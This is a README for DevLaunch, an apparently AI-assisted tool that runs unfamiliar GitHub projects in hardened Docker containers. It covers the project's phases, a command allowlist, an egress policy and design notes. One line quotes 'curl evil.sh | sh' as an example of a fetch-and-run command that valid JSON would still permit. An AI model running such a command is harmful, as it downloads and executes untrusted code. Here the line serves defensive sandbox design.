# DevLaunch

An AI-assisted local deployment engine. Point it at an unfamiliar GitHub repository and
it works out how to run that project, runs it inside a hardened Docker container,
verifies the application is actually serving, streams its logs, and explains any failure.

```
PLAN → EXECUTE → VERIFY → DIAGNOSE → REPAIR
```

Plans are generated **deterministically** from a project's own manifest files for
recognised project types. An LLM is reserved for two places where it genuinely earns
its cost: planning for repositories that match no known pattern, and interpreting
unstructured failure logs. The sandbox executes; the verifier decides. Never the model.

## Status

**Phase 2 complete — security hardening.**

| | Phase | State |
|---|---|---|
| 1 | Minimal Docker runner | ✅ Complete |
| 2 | Security hardening | ✅ Complete |
| 3 | Port + readiness | Not started |
| 4 | Log streaming (WebSocket) | Not started |
| 5 | Repository analyzer | Not started |
| 6 | Rule-based plan generator | Not started |
| 7 | Failure classifier | Not started |
| 8 | AI fallback planner + repair | Stretch |
| 9 | Frontend | Not started |
| 10 | Documentation + portfolio | Not started |

### What Phase 2 delivers

- Containers run **non-root** (uid 1000) with `capDrop ALL`, `no-new-privileges`,
  a **read-only root filesystem**, PID limits, and memory/CPU ceilings — each asserted
  against the state the kernel actually enforces, not the config Docker was handed
- DevLaunch's own runner image (`docker/runner/`), which must pre-create `/workspace`
  owned by the non-root user, because a volume over a path the image lacks mounts root-owned
- **Command allowlist** — approved binaries, no shell metacharacters, and constrained
  `npm run` script names. Schema validation is not security: `curl evil.sh | sh` is
  valid JSON
- **Image allowlist**, frozen at module load
- **Path traversal rejection**, including escapes only visible after normalisation
- **Network egress policy** blocking RFC1918, link-local, and the VM host itself
- 67 security tests (54 unit, 13 integration) covering all ten checks in §27

### What Phase 1 delivers

- `DockerManager` — `create → cp → start` lifecycle over the Docker API
- A **static** container wrapper script; commands arrive via environment variables and
  are never interpolated into the script body
- Phase sentinels that attribute a failure to install, build, or start — necessary
  because the wrapper `exec`s the start command, so the exit code belongs to the app
- `LogBuffer` — ring buffer capped by **bytes first, lines second**, with sequence
  numbers and gap detection for WebSocket resume
- `LogManager` — demultiplexes Docker's framed stream into stdout/stderr lines
- `CleanupManager` — idempotent teardown plus orphan sweeping by label
- Three vendored fixtures and 30 passing tests

## Requirements

- Node >= 20 (developed on 24)
- pnpm
- Docker via Colima (`colima start --cpu 4 --memory 4`)

## Getting started

```bash
pnpm install
./scripts/build-runner-images.sh      # build the allowlisted runner image
./scripts/setup-network-policy.sh     # install the egress policy in the Colima VM
pnpm typecheck
pnpm test          # includes integration tests that drive real containers
pnpm test:unit     # unit tests only, no Docker required
```

Both scripts are idempotent. The network policy lives inside the Colima VM and must be
reapplied if that VM is recreated; without it the security suite fails loudly rather
than passing with weaker isolation.

## Documentation

- [docs/planning-strategy.md](docs/planning-strategy.md) — every settled design
  decision, and the reasoning behind it. Ground truth for the build.
- [docs/limitations.md](docs/limitations.md) — deliberate v1 boundaries, stated plainly.

## Design notes worth knowing

**Host binding is the failure mode that matters.** Vite, Flask, and Django bind
`127.0.0.1` by default. Inside a container that makes Docker's port mapping resolve to
nothing — a perfectly healthy application, completely unreachable. The planner rewrites
start commands to force `0.0.0.0`, and `PORT_BOUND_TO_LOCALHOST` is a failure class of
its own because its remedy differs entirely from a port that never opened.

**Readiness is not correctness.** READY means an HTTP server returned a complete
response — *any* status. An app redirecting `/` to `/login` returns 302; an API with no
root route returns 404. Both are running fine, and neither should fail a run.

**One policy chain is not enough.** `DOCKER-USER` filters only *forwarded* traffic. A
packet from a container to the VM itself — its own gateway included — terminates
locally and hits `INPUT`, which `DOCKER-USER` never sees. Blocking egress requires both
chains; a test asserting the gateway times out is what caught the gap.

**The container is the security boundary, not the planner.** `npm run dev` executes
whatever `package.json` says, and that file is written by the repository author. The
command allowlist constrains what DevLaunch composes; isolation constrains what the
repository does.
